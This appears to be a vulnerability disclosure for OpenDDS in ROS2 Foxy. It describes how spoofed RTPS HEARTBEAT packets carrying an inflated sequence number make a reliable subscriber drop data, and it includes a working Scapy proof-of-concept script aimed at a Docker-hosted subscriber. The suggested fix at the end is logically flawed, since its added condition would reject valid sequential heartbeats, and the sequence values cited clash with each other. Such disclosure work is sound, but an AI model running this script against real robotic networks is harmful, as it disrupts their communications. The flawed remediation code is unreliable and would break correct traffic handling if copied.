# 1. Attack Summary

- **Preconditions**
    - Among ROS2 communication protocols, QoS must be in a state of operating in Reliable mode. 
    
            If the RoS policy is Reliable Mode, Request missing messages again based on Heartbeat packets (Acknack).
    
    - The attacker must exist on the network where the publisher and subscriber communicate and be able to intercept existing communication flow through packet sniffing.
        
        
- **Attack Details**
    - The attacker sniffs the RTPS packet between Publisher (Talker) and Subscriber (Listener) and then uses the Scapy tool to spoof the value of 'guid-prefix, src IP, dst IP, sport, dport, submessageID: HEARTBEAT (flag, octetsToNextHeader, reader/writerEntityId).
    - Subsequently, the Sequence Number within the Heartbeat message is maliciously manipulated to a very high Sequence Number and resent to the Subscriber. As a result, all data sent from the Publisher to the Subscriber is lost.
        - 1,2,3,4... If an attacker manipulates the increasing Sequence Number to 50 and then sends a packet, the Subscriber does not receive the data content from 5 to 49 and lost it, and receives  normal data after 50.
    - The attacked Subscriber cannot receive the Publisher's data afterward.
 
<br/>

# 2. Vulnerability Cause

### Code Analysis

1. **RtpsUdpDataLink::RtpsReader::process_heartbeat_i()**
    - OpenDDS/OpenDDS/blob/branch-DDS-3.25/dds/DCPS/transport/rtps_udp/RtpsUdpDataLink.cpp : #1903
    - Compares the order or count of the current Heartbeat (heartbeat.count.value) and the previous Heartbeat (writer->heartbeat_recvd_count_) to determine if the current Heartbeat message is new, or if it is the same as or older than the one previously received in function **`compare_and_update_counts()`**.
    - If the **`hb_first`** value is less than 1, if the **`hb_last`** value is less than 0, or if the **`hb_last`** value is less than **`hb_first.previous()`**, the message is determined to be incorrect and Error Message is returned.
    - Compares the order or count of the current Heartbeat **`msg->count`** and the previous Heartbeat **`wn->prev_heartbeat`** to determine if the current Heartbeat message is new, or if it is the same as or older than the one previously received.
    
	```c
 	#1903
	void
	RtpsUdpDataLink::RtpsReader::process_heartbeat_i(const RTPS::HeartBeatSubmessage& heartbeat,
	                                                 const GUID_t& src,
	                                                 bool directed,
	                                                 MetaSubmessageVec& meta_submessages)
	{
	  // TODO: Delay responses by heartbeat_response_delay_.
	  ACE_GUARD(ACE_Thread_Mutex, g, mutex_);
	
	  RtpsUdpDataLink_rch link = link_.lock();
	
	  if (!link) {
	    return;
	  }
	
	  GuardType guard(link->strategy_lock_);
	  if (link->receive_strategy() == 0) {
	    return;
	  }
	
	  // Heartbeat Sequence Range
	  const SequenceNumber hb_first = to_opendds_seqnum(heartbeat.firstSN);
	  const SequenceNumber hb_last = to_opendds_seqnum(heartbeat.lastSN);
	
	  if (Transport_debug_level > 5) {
	    ACE_DEBUG((LM_DEBUG, "(%P|%t) RtpsUdpDataLink::RtpsReader::process_heartbeat_i - %C -> %C first %q last %q count %d\n",
	      LogGuid(src).c_str(), LogGuid(id_).c_str(), hb_first.getValue(), hb_last.getValue(), heartbeat.count.value));
	  }
	
	  const WriterInfoMap::iterator wi = remote_writers_.find(src);
	  if (wi == remote_writers_.end()) {
	    if (transport_debug.log_dropped_messages) {
	      ACE_DEBUG((LM_DEBUG, "(%P|%t) {transport_debug.log_dropped_messages} RtpsUdpDataLink::RtpsReader::process_heartbeat_i: %C -> %C unknown remote writer\n", LogGuid(src).c_str(), LogGuid(id_).c_str()));
	    }
	    return;
	  }
	
	  const WriterInfo_rch& writer = wi->second;
	
	  if (!compare_and_update_counts(heartbeat.count.value, writer->heartbeat_recvd_count_)) {
	    if (transport_debug.log_dropped_messages) {
	      const GUID_t dst = heartbeat.readerId == DCPS::ENTITYID_UNKNOWN ? GUID_UNKNOWN : id_;
	      ACE_DEBUG((LM_DEBUG, "(%P|%t) {transport_debug.log_dropped_messages} RtpsUdpDataLink::RtpsReader::process_heartbeat_i: %C -> %C stale/duplicate message (%d vs %d)\n",
	        LogGuid(src).c_str(), LogGuid(dst).c_str(), heartbeat.count.value, writer->heartbeat_recvd_count_));
	    }
	    VDBG((LM_WARNING, "(%P|%t) RtpsUdpDataLink::process_heartbeat_i "
	          "WARNING Count indicates duplicate, dropping\n"));
	    return;
	  }
	
	  const bool is_final = heartbeat.smHeader.flags & RTPS::FLAG_F;
	
	  static const SequenceNumber one, zero = SequenceNumber::ZERO();
	
	  bool first_ever_hb = false;
	
	  if (!is_final && transport_debug.log_nonfinal_messages) {
	    ACE_DEBUG((LM_DEBUG, "(%P|%t) {transport_debug.log_nonfinal_messages} RtpsUdpDataLink::RtpsReader::process_heartbeat_i - %C -> %C first %q last %q count %d\n",
	      LogGuid(src).c_str(), LogGuid(id_).c_str(), hb_first.getValue(), hb_last.getValue(), heartbeat.count.value));
	  }
	
	  // Only valid heartbeats (see spec) will be "fully" applied to writer info
	  if (!(hb_first < 1 || hb_last < 0 || hb_last < hb_first.previous())) {
	    if (writer->recvd_.empty() && (directed || !writer->sends_directed_hb())) {
	      OPENDDS_ASSERT(preassociation_writers_.count(writer));
	      preassociation_writers_.erase(writer);
	      if (transport_debug.log_progress) {
	        log_progress("RTPS reader/writer association complete", id_, writer->id_, writer->participant_discovered_at_);
	      }
	      log_remote_counts("process_heartbeat_i");
	
	      const SequenceRange sr(zero, hb_first.previous());
	      writer->recvd_.insert(sr);
	      while (!writer->held_.empty() && writer->held_.begin()->first <= sr.second) {
	        writer->held_.erase(writer->held_.begin());
	      }
	      for (WriterInfo::HeldMap::const_iterator it = writer->held_.begin(); it != writer->held_.end(); ++it) {
	        writer->recvd_.insert(it->first);
	      }
	      link->receive_strategy()->remove_fragments(sr, writer->id_);
	      first_ever_hb = true;
	    }
	
	    ACE_CDR::ULong cumulative_bits_added = 0;
	    if (!writer->recvd_.empty()) {
	      writer->hb_last_ = std::max(writer->hb_last_, hb_last);
	      gather_ack_nacks_i(writer, link, !is_final, meta_submessages, cumulative_bits_added);
	    }
	    if (cumulative_bits_added) {
	      RtpsUdpInst_rch cfg = link->config();
	      if (cfg && link->transport_statistics_.count_messages()) {
	        ACE_Guard<ACE_Thread_Mutex> tsg(link->transport_statistics_mutex_);
	        link->transport_statistics_.reader_nack_count[id_] += cumulative_bits_added;
	      }
	    }
	  } else {
	    ACE_ERROR((LM_ERROR, "(%P|%t) ERROR: RtpsUdpDataLink::RtpsReader::process_heartbeat_i: %C -> %C - INVALID - first %q last %q count %d\n", LogGuid(writer->id_).c_str(), LogGuid(id_).c_str(), hb_first.getValue(), hb_last.getValue(), heartbeat.count.value));
	  }
	
	  guard.release();
	  g.release();
	
	  if (first_ever_hb) {
	    link->invoke_on_start_callbacks(id_, src, true);
	  }
	
	  DeliverHeldData dhd(rchandle_from(this), src);
	
	  //FUTURE: support assertion of liveliness for MANUAL_BY_TOPIC
	  return;
	}
    ```   
 	 - However, the conditions for creating the above malformed packet can be acquired by the attacker through packet sniffing.
 
<br/>

# 3. Vulnerability Impact

- Looking at the logic of heartbeat processing in the RtpsUdpDataLink.cpp file, `There is no validation for Heartbeat Sequence Number.`
- If an attacker arbitrarily includes a very high sequence number (e.g., 999999) in the HeartBeat message and sends it to the Subscriber, the Subscriber will `repeatedly send` an Acknack response to the Publisher that sent the sequence number (e.g., 999999).
- However, `actually, the missing messages (Heartbeat Sequence Number=99999) do not exist, which can result in a Denial of Service (DoS) condition in the system.`


<p align="center"><img src="https://github.com/BOB12thCVEIssacGleaning/CVEIssacGleaning/assets/146199020/14df5f1b-d5a9-419b-8ae5-eed7c7f62cea" width="800" height="550"/>


  ## 3.1. Affected Version

- **Commint Analysis**
    - OpenDDS/OpenDDS/blob/branch-DDS-3.25/dds/DCPS/transport/rtps_udp/RtpsUdpDataLink.cpp
    - Since the initial commit of the RtpsUdpDataLink.cpp code (Valid Heartbeat function) on Sep 8, 2011, Heartbeat Sequence Attack Vulnerabilities have been present up to the current date.
    
| COMMIT TIME | COMMIT ID | Issue |
|:---:|:---:|:---:|
| Sep  8, 2011 | 41826ff23e0a5f5f76af8aeeb648317c33adb449 | Initial Contribution |
| Jun 16, 2023 | 819fe4794313979456a7d4dd65c7c6c46608db50 | latest Contribution |


<br/>

# 4. Test Environment + PoC

- **Attack Environment Required Info**
    - Operating System : Ubuntu 20.04 LTS
    - ROS2 FOXY OpenDDS - 2 Docker environments (172.17.0.2, 172.17.0.3)
- **Attack Description**
    - **[Attacker]** Uses the scapy tool to include a random very high Sequence Number (ex. 999999) in a HeartBeat message and sends it to the Subscriber (Listener).
    - **[victim]**  The Subscriber (listener) does not receive the data sent by the publisher until the Sequence Number is 999999.

![image](https://github.com/BOB12thCVEIssacGleaning/CVEIssacGleaning/assets/63354563/45752eb5-b7d4-4282-b265-73d13099dbdb)

## 4.1. POC (Proof of concept)

```python
# made by CVEIssacGleaning
from scapy.all import *
from scapy.contrib.rtps import *


# RTPS Header
class RTPS(Packet):
    name = "RTPS Header"
    fields_desc = [
        XIntField("magic", 0x52545053),  # RTPS in hex
        XByteField("major", 2),
        XByteField("minor", 3),
        XShortField("vendor_id", 0x010f),
        XIntField("hostId", 0x010feb7d),
        XIntField("appId", 0x9b0014a9),
        XIntField("instanceId", 0x00000000)
    ]
 


class RTPSSubMessage_HEARTBEAT(Packet):
    name = "RTPS HEARTBEAT"
    fields_desc = [
        XByteField("submessageId", 0x07),
        XByteField("flags", 0x01),
        XShortField("octetsToNextHeader", 0x1c00),
        X3BytesField("readerEntityIdKey", 0x000012),
        XByteField("readerEntityIdKind", 0x04),
        X3BytesField("writerEntityIdKey", 0x000012),
        XByteField("writerEntityIdKind", 0x03),
        LongField("firstAvailableSeqNumber", 0xf423f00),  # Use LELongField here
        LongField("lastSeqNumber", 0xf423f00),           # Use LELongField here
        XIntField("count", 0xf423f00)
    ]



for _ in range(2):  
	packet = Ether(src="02:42:ac:11:00:02" ,dst="02:42:ac:11:00:03") / \
		IP(src="172.17.0.2",dst="172.17.0.3") / \
		UDP(sport=33524, dport=7411) / RTPS() / RTPSSubMessage_HEARTBEAT()
	sendp(packet, iface="docker0")
```

## 4.2. Attack Outcome
- **QoS - `Reliable Pub/Sub`**
    - [Reliable Publisher] Talker → [Reliable Subscriber] Listener
      
|ROS2 Version|OpenDDS|RMW - OpenDDS|Attack Result|
|:---:|:---:|:---:|:---:|
|FOXY|0.1.0|1.0.1-1|O|

<br/>

# 5. Recommendations

- **A code must exist to verify the sequential increase in Seqenunce.**
    - ex) example code
    - When the previous sequence number is saved and the value of the currently incoming sequence number is not the same as the previous sequence number +1, it must be processed as a malformed packet.
    - prevSeqN in the code below is heartbeat last sequence number of the prior heartbeat packet and **`hb_last`** is last sequence number of the current heartbeat packet.
    ```c
    #/OpenDDS/OpenDDS/blob/branch-DDS-3.25/dds/DCPS/transport/rtps_udp/RtpsUdpDataLink.cpp: #1965
    #prevSeqN is hb_last of the prior heartbeat packet
    if (!(hb_first < 1 || hb_last < 0 || hb_last < hb_first.previous() || hb_last == prevSeqN + 1)) {
    ```
